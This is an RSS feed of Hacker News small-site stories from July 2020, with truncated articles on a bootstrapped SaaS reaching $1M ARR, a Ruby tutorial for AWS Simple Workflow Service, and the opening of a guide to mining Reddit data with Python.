<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 17 Jul 2020 12:23:25 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 17 Jul 2020 12:23:25 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[$0-$1M ARR in 12 Months Bootsrapped]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23844894">thread link</a>) | @sabbakeynejad
<br/>
July 15, 2020 | https://www.veed.io/blog/0-1m-arr-12-months/ | <a href="https://web.archive.org/web/*/https://www.veed.io/blog/0-1m-arr-12-months/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Screenshot-2020-06-24-at-14.40.11.png 300w,
                            https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Screenshot-2020-06-24-at-14.40.11.png 600w,
                            https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Screenshot-2020-06-24-at-14.40.11.png 1000w,
                            https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Screenshot-2020-06-24-at-14.40.11.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Screenshot-2020-06-24-at-14.40.11.png" alt="0-1M ARR in 12 Months Bootsrapped">
            </figure>

            <section>
                <div>
                    <p>VEED.IO has grown fast.</p><p>12 months ago we turned on our paywall and made our first ever SaaS $1.</p><p>For any entrepreneur, this is a moment that they will never forget. Tim and I could not control our excitement.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG_0318.jpeg"><figcaption>Our first ever $1 - 12 months ago</figcaption></figure><p>You achieved the impossible, there is light at the end of the tunnel and everything you have been dreaming about and working towards might come true!</p><p>Exactly 12 months after this first payment, we have managed to cross the seemingly impossible task of hitting $83,333 MRR / $1M ARR.</p><p>And the best part is we did it 100% self-funded, with no external funding.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG-20200703-WA0015-1.jpg"><figcaption>1M ARR - Tim &amp; Sabba - VEED.IO</figcaption></figure><p>In this post, I would like to share relevant financial data that might give other founders insights into how to build their own bootstrapped SaaS to $1M ARR.</p><p>I would also like to share some insights into our attitudes and believes that have got us to where we are. Such as our bullish attitude towards growth, how we build the product and how we think about the future of VEED.</p><h3 id="the-numbers">The Numbers</h3><p>First off, we are aware that we did this very fast and we also go lucky (I talk about this more below) From the outside, VEED might look like an overnight success, however it was 10 years in the making!</p><p>Before we look at the numbers, I would like to provide some context. When we started charging, we already had about 30,000 MAU. However, pretty much none of those users would speak to us and we were unsure that if we added the paywall any of the users would upgrade.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-149.png"><figcaption>1M ARR in 12 Months</figcaption></figure><p>Growth starts slow, but having a product that is scalable and can we assessed globally from day one really means the sky is the limit. 6 months in, our projection for 1M ARR was December, then August and due to increasing demand influenced by the pandemic, we hit 1M ARR in June. </p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-150.png"><figcaption>ARR Milestones</figcaption></figure><p>As you can see, the first $100K ARR took 171 days to reach and the following $100K took just 48 days. The reason why the 2nd was much quicker than the first is because we were learning from users and building the required product features. We were also learning more about our acquisition channels and were able to double down on them. </p><p>Although 171 days is not a very long period of time, turning up to the office and putting in 12 hours every day can be really draining. The stress of getting to profitability was really real. For bootstrapped startup, be aware that it can really take some time.</p><p>Like with anything with compounding growth your first 100K takes ages, but the next comes a lot quicker. It took 12 months for us to hit 1M ARR, however we are projected to hit 2M in just 4 months!</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-151.png"><figcaption>1M ARR Traffic Growth</figcaption></figure><p>Bootstrapping is hard work, but as you grow it gets a lot easier. The speed in which you grow makes a HUGE difference to the bootstrapping experience. You need to get the flywheel moving super fast to keep everyone motivated and to get you to ramen profitability.</p><p>6 months after our first-ever paid users, we reached $10K MRR. Although a relatively small sum, it was enough to support the founding team.</p><p>This is important as it means you can donate 100% of your time building and growing your product.</p><p>However, if it took 18 months to reach this goal, the market would have moved on, our attitudes towards the product would have changed and maybe we would have been disillusioned. Otherwise known as the "Long, Slow, SaaS Ramp of Death"</p><p>From our experience, there are three keys to successfully bootstrapping.</p><h3 id="your-ideas-at-the-core-"><br>Your ideas at the core.</h3><p>A common mistake I often see is founders building way too much!</p><p>Building any app is hard work. If you set out to build a fully-fledged product you might never finish and more importantly, you are not getting valuable feedback from your users to help shape your product.</p><p>Setting the bar too high will also delay your launch and also make responding to feedback much harder due to a bloated codebase and feature set.</p><p>After years of building VEED, we don't even think we are at version 1.0.</p><p>We believe the best thing to do is to build your MVP and get it out into the world as soon as possible. The first version of VEED had only 4 features, Trim, Crop, Draw and Text. There was no login, no accounts, just a simple web app. Looking back, I think we made way too much, we should have launched with just a really good crop tool.</p><p>After we saw that users were responding well to your app, we started building new features that they had requested. This kickstarted our build measure learn process. So you need to find the minimum set of features that represents your idea.</p><h3 id="validate-your-ideas-fast-">Validate your ideas fast.</h3><p>When I first entered the startup world, I was under the impression that you needed a new and original idea. For many years I tried that approach with little to no success.</p><p>In my opinion, the best way to validate an idea is to look to see if this is a product people are already willing to pay for.</p><p>For example, I would feel comfortable that people are willing to pay for an email marketing tool. Why? Because Mailchimp has proven this for us!</p><p>This questions now is, how are you different or what subset of users do you believe they are undeserving?</p><p>For us at VEED, we knew people where the will to pay for video editing software (I know because I had an Adobe subscription myself). What we did differently is we just put it online and targeted, short-form content creators.</p><p>Why? Because we believe they were being underserved by legacy video editing platform. One of my fave tutors from art school once told me "An original idea is not something completely new, it just 10% different"</p><p>If it feels like you are pushing a boulder uphill and struggling to get traction, it might be time to move to the next idea. Seriously, the faster you can get to this realisation, the better. Don't let a "sunk cost" fallacy keep you working on the same idea.<br></p><h3 id="work-out-how-to-charge-for-your-product-early-on-">Work out how to charge for your product early on.</h3><p>Your funds will not last forever. We ran out of money before and had to go back to contract jobs. This ultimately set us back 6 months. To give your startup the best opportunity for success (I believe this both applies to Boostrapped &amp; VC backed startups, with some exceptions*) it has to generate revenue, a clear sign that you are creating value.</p><p>And charging for your product early on does a few things.</p><ol><li>Proves that users are willing to pay for it.</li><li>Provides you with better feedback (users care more if they are paying)</li><li>Lowers your burn rate and gets your closer to profitability.</li></ol><p>If you can't avoid writing a lot of code before you get your basic product live, you can follow the real estate showroom strategy!</p><p>When a property developer is building a new block of flats, the first thing they do is build a showroom and start selling! Then once someone is interested and buys, you can ask them what colour they want the walls and ask them what taps they would like in the bathroom.</p><p>Overall we have been laser-focused over the last 12 months. We have not gone to any conferences, pitched investors, built pointless pitch decks, entertained any partnerships. We have just been 100% focused on building VEED, learning from our users and growing the company.</p><h3 id="product">Product </h3><p>Our product development strategies are user-centric. Every user who signs up for VEED can book an on-boarding call with us. This process is time-consuming but provided incredible insight into who our users are, what they don't understand and what they need from VEED.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG_20200714_174440.jpg"><figcaption>User calls every day of the week</figcaption></figure><p>We have built new features fast and scrapped useless features even quicker. Overall we have put a lot of time into UX, but I must admit consistency with the design is sometimes lacking. But that is the cost we are willing to pay to move fast.</p><p>New paid users are also prompted to let us know why they chose VEED. We have collected over 500 of these responses and use them to inform our copy and also our focus.</p><h3 id="marketing">Marketing</h3><div><p>For the first 8 months, Tim has spent all of his time building the product and I (Sabba) have spent all of my time working on marketing. Admittedly, we were shameless and scrappy and had varying levels of success.</p><p>When starting VEED we knew nothing about marketing, so we made it our full-time job to learn and execute on our findings.</p></div><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG_20200714_174857.jpg"><figcaption>58 users a day was HUGE!!!</figcaption></figure><p>For first time founders, growth and marketing are often overlooked. The majority of the time, this is because it can appear confusing and complex. Another big reason why technical founder shies away from marketing is that they feel a lot more comfortable coding a new feature because that is what they know.</p><p>You need to understand what acquisition channels are the most relevant for your startup and go deep on understanding them. The book "Traction" by Gabriel Weinberg, founder of DuckDuckGo is a great starting point.</p><p>If you would like to lean more about the exact tactics we used to grow VEED, please check an older post on how we <a href="https://www.veed.io/blog/startup-growth-no-budget/">grew to 50,000 MAU</a></p><p>As entrepreneurs, we like to believe there as a playbook and a recipe to build a successful business.</p><p>The truth is there kinda is, but one of the largest factors of a successful business is luck. A topic topic that many founders like to admit.</p><p>Yes, we worked hard, we made educated decisions, learnt as much as we could and applied our knowledge the best as we could. But looking back on how we got here, I just can't kick the feeling that we got lucky.</p><p>This is my imposter syndrome kicking in again</p><p>The good news is that luck is not 100% out of control and there are things we can do to make ourselves luckier. Two important things happened during our journey that we were smart enough to capitalise on and make ourselves more lucky.</p><blockquote>Example 1<br><strong>We got lucky: </strong>Finding our first two engineers, Mate and Veljko. Without these two we would not be here today. Period.<p><strong>We made our luck: </strong>Posting the job posts everywhere, interviewing as many candidates as possible, not settling for ok. We wouldn't stop until we found the right people, the 100% yes's.</p></blockquote><blockquote>Example 2<br><strong>We got lucky: </strong>Tim …</blockquote></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.veed.io/blog/0-1m-arr-12-months/">https://www.veed.io/blog/0-1m-arr-12-months/</a></em></p>]]>
            </description>
            <link>https://www.veed.io/blog/0-1m-arr-12-months/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23844894</guid>
            <pubDate>Wed, 15 Jul 2020 13:27:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Simple Workflow Service (SWF)]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 11 (<a href="https://news.ycombinator.com/item?id=23844177">thread link</a>) | @adrianancona
<br/>
July 15, 2020 | https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/ | <a href="https://web.archive.org/web/*/https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In this post I’m going to explore Simple Workflow Service (SWF) available in AWS.</p>

<p>To understand what SWF is good for, we need to first understand what a workflow is. <a href="https://en.wikipedia.org/wiki/Workflow">Wikipedia defines it</a> as follows:</p>

<blockquote>
  <p>A workflow consists of an orchestrated and repeatable pattern of activity, enabled by the systematic organization of resources into processes that transform materials, provide services, or process information. It can be depicted as a sequence of operations, the work of a person or group, the work of an organization of staff, or one or more simple or complex mechanisms.</p>
</blockquote>

<p>In computer systems we care about the part about processing information. Some things that could be modeled as workflows:</p>

<ul>
  <li><strong>Deployment pipeline</strong>: We could receive some code as input and then build it in a worker machine. We can run tests in parallel in different machines. If all tests pass we can deploy the binaries to another set of machines.</li>
  <li><strong>Coordinate shipments</strong>: A user buys a product on an online store and the order is placed on a system. A human monitors this system and takes care of finding the products in a warehouse and shipping them to the correct address. When the shipment is made, the information is entered in a system. The workflow notices this information an e-mails the user the shipping details.</li>
  <li><strong>Asynchronous image processing</strong>: A system uploads files to a system for processing (let’s say, create thumbnails). A workflow uses multiple workers to execute the task. If any of the machines fails while processing a set of files, they same work can be taken over by another worker.</li>
</ul>

<!--more-->

<p>Those are some high level examples. In this post I’m going to go over one example in more detail.</p>

<h2 id="components">Components</h2>

<p>Before we start building a workflow, let’s learn a little about the components of an SWF:</p>

<ul>
  <li><strong>Workflow</strong>: A set of activities, and some logic that defines how these work together to achieve some objective</li>
  <li><strong>Domain</strong>: A workflow lives in a domain. A Domain can contain multiple workflows. Workflows in different domains can’t interact</li>
  <li><strong>Execution</strong>: An instance of the workflow with its associated state</li>
  <li><strong>Event</strong>: Represents a change on the state of an execution</li>
  <li><strong>Starter</strong>: A program, or person that starts and execution</li>
  <li><strong>Activity</strong>: A type of task that needs to be performed, such as: resizing images, running tests, etc</li>
  <li><strong>Task</strong>: An invocation of an activity</li>
  <li><strong>Worker</strong>: Program that performs tasks</li>
  <li><strong>Decider</strong>: Program that defines the logic for the workflow</li>
</ul>

<h2 id="machine-repair-workflow">Machine repair workflow</h2>

<p>To help us get familiar with SWF, we are going to create a workflow to model the process for fixing a broken machine in a fleet. It will look something like this:</p>

<p><a href="https://ncona.com/images/posts/fixing-broken-machine-workflow.png"><img src="https://ncona.com/images/posts/fixing-broken-machine-workflow.png" alt="Fixing broken machine workflow"></a></p>

<p>This workflow can be used in a datacenter that runs a lot of machines. We can have the workflow probe machines to see if they are working well. If it notices something wrong, it sets the machine state as <code>maintenance</code> in a database. If it doesn’t find anything wrong, it finishes the execution.</p>

<p>Once a machine is drained we’ll do two things. We’ll have a person take a look at the machine and fix it and we’ll take the oportunity to reimage the machine so we have clean machine when it comes back.</p>

<p>Once the repair and the reimage are done, we can set the state back to <code>available</code> and finish the execution.</p>

<h2 id="getting-ready">Getting ready</h2>

<p>For our activities and the decider, we are going to need the AWS SDK. In this section I’m going to show how to get it ready.</p>

<p>We’ll use Ruby for our examples, since it’s easy to run and it’s very well supported. The latest version of the Ruby SDK at the time of this writing is version 3. We’ll create a <code>Gemfile</code> with dependencies:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>source</span> <span>'https://rubygems.org'</span>

<span>gem</span> <span>'aws-sdk-swf'</span><span>,</span> <span>'~&gt; 1'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can then install them using:</p>



<p>The AWS SDK will need to communicate with AWS, so we’ll need some credentials, these credentials can be set in environment variables like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span>export </span><span>AWS_ACCESS_KEY_ID</span><span>=</span>&lt;your key <span>id</span><span>&gt;</span>
<span>export </span><span>AWS_SECRET_ACCESS_KEY</span><span>=</span>&lt;your secret&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="activities">Activities</h2>

<p>Each of the boxes in the diagram above is an <code>activity</code>. Activities can be pretty self contained, so we’ll start building those.</p>

<p>An activity works by polling the workflow for pending tasks. If it finds that there is a task it can perform, it does so, and returns a result back. Polling then continues until there is more work to do.</p>

<p>Our activities will share some code with the decider, so let’s create a base class that will be shared between them (<code>workflow_base.rb</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td><pre><span>require</span> <span>'aws-sdk-swf'</span>

<span>class</span> <span>WorkflowBase</span>
  <span>DOMAIN_NAME</span> <span>=</span> <span>'datacenter-domain'</span>
  <span>REGION</span> <span>=</span> <span>'ap-southeast-2'</span>
  <span>TASK_LIST_NAME</span> <span>=</span> <span>'repairs-workflow-task-list'</span>
  <span>VERSION</span> <span>=</span> <span>'14'</span>

  <span>def</span> <span>initialize</span>
    <span>@swf</span> <span>=</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Client</span><span>.</span><span>new</span><span>(</span><span>region: </span><span>REGION</span><span>)</span>
    <span>register_domain</span><span>(</span><span>REGION</span><span>,</span> <span>DOMAIN_NAME</span><span>)</span>
  <span>end</span>

  <span># Register a domain for our workflow (if it doesn't already exist)</span>
  <span>def</span> <span>register_domain</span><span>(</span><span>region</span><span>,</span> <span>domain_name</span><span>)</span>
    <span>swf</span> <span>=</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Client</span><span>.</span><span>new</span><span>(</span><span>region: </span><span>region</span><span>)</span>
    <span>begin</span>
      <span>swf</span><span>.</span><span>register_domain</span><span>({</span>
        <span>name: </span><span>domain_name</span><span>,</span>
        <span>workflow_execution_retention_period_in_days: </span><span>'3'</span>
      <span>})</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> registered"</span>
    <span>rescue</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Errors</span><span>::</span><span>DomainAlreadyExistsFault</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> already exists"</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This class defines some constants that are shared between the decider and activities. It also initializes the SWF client and register the domain if it doesn’t yet exist.</p>

<p>Because of the way SWF works, it is best if the code for all our activities is handled by a single program. This program will poll for any new tasks in the domain. Every time it sees a task it will execute it and send the result back to SWF. Because each task is blocking, we could spin many copies of this program to allow tasks to be executed in parallel if we wanted to.</p>

<p>The activities handler (<code>activities.rb</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
</pre></td><td><pre><span>require</span> <span>'aws-sdk-swf'</span>
<span>require_relative</span> <span>'workflow_base.rb'</span>

<span>class</span> <span>Activities</span> <span>&lt;</span> <span>WorkflowBase</span>
  <span>ACTIVITIES</span> <span>=</span> <span>[</span>
    <span>'probe_machines'</span><span>,</span>
    <span>'drain_machine'</span><span>,</span>
    <span>'fix_machine'</span><span>,</span>
    <span>'reimage_machine'</span><span>,</span>
    <span>'enable_machine'</span>
  <span>]</span>

  <span>def</span> <span>initialize</span>
    <span>super</span><span>()</span>
    <span>register_activities</span>
    <span>poll</span>
  <span>end</span>

  <span># Register the activities with the domain</span>
  <span>def</span> <span>register_activities</span><span>()</span>
    <span>ACTIVITIES</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>activity</span><span>|</span>
      <span>begin</span>
        <span>@swf</span><span>.</span><span>register_activity_type</span><span>({</span>
          <span>domain: </span><span>DOMAIN_NAME</span><span>,</span>
          <span>name: </span><span>activity</span><span>,</span>
          <span>version: </span><span>VERSION</span><span>,</span>
          <span># Maximum time it can take to process an activity</span>
          <span>default_task_start_to_close_timeout: </span><span>'60'</span>
        <span>})</span>
        <span>puts</span> <span>"Activity </span><span>#{</span><span>activity</span><span>}</span><span> registered"</span>
      <span>rescue</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Errors</span><span>::</span><span>TypeAlreadyExistsFault</span>
        <span>puts</span> <span>"Activity </span><span>#{</span><span>activity</span><span>}</span><span> already exists"</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>

  <span># Poll the domain for tasks for this activity</span>
  <span>def</span> <span>poll</span>
    <span>while</span> <span>true</span>
      <span>options</span> <span>=</span> <span>{</span>
        <span>domain: </span><span>DOMAIN_NAME</span><span>,</span>
        <span>task_list: </span><span>{</span>
          <span>name: </span><span>TASK_LIST_NAME</span>
        <span>}</span>
      <span>}</span>
      <span>task</span> <span>=</span> <span>@swf</span><span>.</span><span>poll_for_activity_task</span><span>(</span><span>options</span><span>)</span>

      <span>if</span> <span>task</span><span>.</span><span>task_token</span> <span>==</span> <span>nil</span>
        <span>puts</span> <span>'Polling expired for activities expired. Trying again'</span>
        <span>next</span>
      <span>end</span>

      <span>if</span> <span>!</span><span>ACTIVITIES</span><span>.</span><span>include?</span><span>(</span><span>task</span><span>.</span><span>activity_id</span><span>)</span>
        <span>raise</span> <span>"Activity </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span> unknown"</span>
      <span>end</span>

      <span># If execute is successfull, it will return the result, otherwise ti will</span>
      <span># throw</span>
      <span>puts</span> <span>"Executing </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>"</span>
      <span>begin</span>
        <span># Call the method for the activity</span>
        <span>result</span> <span>=</span> <span>send</span><span>(</span><span>task</span><span>.</span><span>activity_id</span><span>,</span> <span>task</span><span>,</span> <span>task</span><span>.</span><span>input</span><span>)</span>

        <span>puts</span> <span>"Completing </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>"</span>
        <span>@swf</span><span>.</span><span>respond_activity_task_completed</span><span>({</span>
          <span>task_token: </span><span>task</span><span>.</span><span>task_token</span><span>,</span>
          <span># SWF doesn't provide a way to know which activity this result</span>
          <span># belongs to, so we'll prepend the result with it</span>
          <span>result: </span><span>"</span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>:</span><span>#{</span><span>result</span><span>}</span><span>"</span>
        <span>})</span>
      <span>rescue</span> <span>=&gt;</span> <span>e</span>
        <span>puts</span> <span>e</span>
        <span>puts</span> <span>"Failing </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>"</span>
        <span>@swf</span><span>.</span><span>respond_activity_task_failed</span><span>({</span>
          <span>task_token: </span><span>task</span><span>.</span><span>task_token</span><span>,</span>
          <span>reason: </span><span>@failure</span>
        <span>})</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>

  <span>def</span> <span>probe_machines</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span># Because this is just an example and I don't actually have machines to test,</span>
    <span># I'm going to use some mock data</span>
    <span>machines</span> <span>=</span> <span>[</span>
      <span>'machine-A459Z'</span><span>,</span>
      <span>'machine-M3992'</span><span>,</span>
      <span>'machine-A873R'</span>
    <span>]</span>

    <span>machines</span><span>.</span><span>each</span> <span>do</span> <span>|</span> <span>machine</span> <span>|</span>
      <span># A machine is bad, set it to maintenance</span>
      <span>if</span> <span>check_machine</span><span>(</span><span>machine</span><span>)</span> <span>==</span> <span>'FAIL'</span>
        <span># In a real scenario we would update the database with the new state</span>
        <span>puts</span> <span>"Set machine </span><span>#{</span><span>machine</span><span>}</span><span> to maintenance"</span>
        <span>return</span> <span>machine</span>
      <span>end</span>
    <span>end</span>

    <span>puts</span> <span>'No bad machines found'</span>
    <span>return</span> <span>''</span>
  <span>end</span>

  <span># Randomly decide if it's drained. In a real scenario we would communicate with</span>
  <span># the machine, or check a database</span>
  <span>def</span> <span>drain_machine</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span>puts</span> <span>"Draining machine </span><span>#{</span><span>input</span><span>}</span><span>"</span>
    <span>random_number</span> <span>=</span> <span>rand</span><span>(</span><span>5</span><span>)</span>
    <span>if</span> <span>random_number</span> <span>==</span> <span>4</span>
      <span>puts</span> <span>'Machine is drained'</span>
      <span>return</span>
    <span>end</span>

    <span>raise</span> <span>"</span><span>#{</span><span>input</span><span>}</span><span> is not drained"</span>
  <span>end</span>

  <span># In real life we would check if a human has marked the task as fixed. In this</span>
  <span># case, we'll just sleep and use a random number</span>
  <span>def</span> <span>fix_machine</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span>puts</span> <span>"Check if machine </span><span>#{</span><span>input</span><span>}</span><span> is fixed"</span>
    <span>sleep</span><span>(</span><span>1</span><span>)</span>
    <span>random_number</span> <span>=</span> <span>rand</span><span>(</span><span>2</span><span>)</span>
    <span>if</span> <span>random_number</span> <span>==</span> <span>1</span>
      <span>puts</span> <span>"Machine </span><span>#{</span><span>input</span><span>}</span><span> has been fixed"</span>
      <span>return</span>
    <span>end</span>

    <span>raise</span> <span>"</span><span>#{</span><span>input</span><span>}</span><span> is not fixed yet"</span>
  <span>end</span>

  <span># In real life we would use something like chef to re-image the machine here</span>
  <span># we'll just sleep and use a random number</span>
  <span>def</span> <span>reimage_machine</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span>puts</span> <span>"Reimaging </span><span>#{</span><span>input</span><span>}</span><span>"</span>
    <span>sleep</span><span>(</span><span>1</span><span>)</span>
    <span>random_number</span> <span>=</span> <span>rand</span><span>(</span><span>2</span><span>)</span>
    <span>if</span> <span>random_number</span> <span>==</span> <span>1</span>
 …</pre></td></tr></tbody></table></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/">https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/</a></em></p>]]>
            </description>
            <link>https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23844177</guid>
            <pubDate>Wed, 15 Jul 2020 12:26:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mining and Exploring Reddit Data Using Python, Easy]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23843902">thread link</a>) | @klarahorton
<br/>
July 15, 2020 | https://beta.deepnote.com/article/mining-and-exploring-reddit-data-using-python | <a href="https://web.archive.org/web/*/https://beta.deepnote.com/article/mining-and-exploring-reddit-data-using-python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><p>

Reddit <span>is</span> a social network which <span>is</span> mainly organized <span>in</span> communities<span>,</span> also called <span>*</span>subreddit<span>*</span><span>.</span> Each subreddit can be topic<span>-</span>oriented<span>,</span> e<span>.</span>g<span>.</span><span>,</span> <span>[</span><span>/</span>r<span>/</span>gaming<span>]</span><span>(</span>http<span>:</span><span>//</span>reddit<span>.</span>com<span>/</span>r<span>/</span>gaming<span>)</span><span>,</span> <span>or</span> more general<span>,</span> e<span>.</span>g<span>.</span><span>,</span> <span>[</span><span>/</span>r<span>/</span>iama<span>]</span><span>(</span>https<span>:</span><span>//</span>www<span>.</span>reddit<span>.</span>com<span>/</span>r<span>/</span>IAmA<span>/</span><span>)</span><span>,</span> <span>and</span> <span>is</span> populated of submissions posted by users<span>.</span> Each submission can be commented by other users <span>and</span> can be upvoted <span>or</span> downvote<span>,</span> marginally similar to a like <span>or</span> dislike<span>.</span> <span>[</span>At the time of writing<span>]</span><span>(</span>https<span>:</span><span>//</span>www<span>.</span>redditinc<span>.</span>com<span>/</span><span>)</span><span>,</span> Reddit <span>is</span> the <span>5</span><span>-</span>th most visited website <span>in</span> the US <span>and</span> has 430M<span>+</span> average monthly active users<span>.</span>

To explore <span>and</span> mine Reddit<span>,</span> we need a way to access <span>all</span> of its exposed data<span>,</span> such <span>as</span> submissions<span>,</span> comments <span>and</span> users' information<span>.</span> The more brutal <span>and</span> straightforward way obviously <span>is</span> that of scrape the website itself<span>.</span> In particular<span>,</span> scraping Reddit would require a scraper<span>,</span> that <span>is</span> a software which should request one <span>or</span> more webpages<span>,</span> parse them <span>and</span> extract the information of interest<span>.</span> However<span>,</span> this <span>is</span> marginally doable <span>and</span> there are cases <span>in</span> which scraping a website would violate the Term of Service <span>(</span>ToS<span>)</span> of the website itself<span>.</span> Thus<span>,</span> we surely need another way to do it<span>.</span>

Luckily <span>for</span> us<span>,</span> there <span>is</span> a service called <span>[</span>pushshift<span>.</span>io<span>]</span><span>(</span>http<span>:</span><span>//</span>pushshift<span>.</span>io<span>)</span> that provides Reddit data by allowing users to access it via two different forms<span>,</span> that are the direct download of datasets containing Reddit data <span>and</span> the usage of an Application Programming Interface <span>(</span>API<span>)</span><span>.</span> In our case<span>,</span> we resort on the latter by using <span>**</span>psaw<span>**</span><span>,</span> an API wrapper <span>for</span> pushshift<span>.</span>io<span>.</span> To install it<span>,</span> just <span>open</span> up your favourite shell <span>and</span> <span>type</span>

```bash
pip install psaw
```

Having psaw installed<span>,</span> we are now able to query pushshift<span>.</span>io’s API by using the library itself<span>.</span>

To use the library<span>,</span> we need an instance of `PushshiftAPI`<span>.</span> It will be the <span>*</span>entry point<span>*</span> <span>for</span> <span>any</span> request<span>.</span> We can find `PushshiftAPI` within psaw<span>,</span> thus we can <span>import</span> it <span>and</span> define an instance<span>:</span></p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://beta.deepnote.com/article/mining-and-exploring-reddit-data-using-python</link>
            <guid isPermaLink="false">hacker-news-small-sites-23843902</guid>
            <pubDate>Wed, 15 Jul 2020 11:53:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Speeding up similarity search in recommender systems using FAISS]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23843752">thread link</a>) | @drishya
<br/>
July 15, 2020 | https://caboom.ai/blog/speeding-up-similarity-search-in-recommender-systems-using-faiss-basics-part-i | <a href="https://web.archive.org/web/*/https://caboom.ai/blog/speeding-up-similarity-search-in-recommender-systems-using-faiss-basics-part-i">archive.org</a>
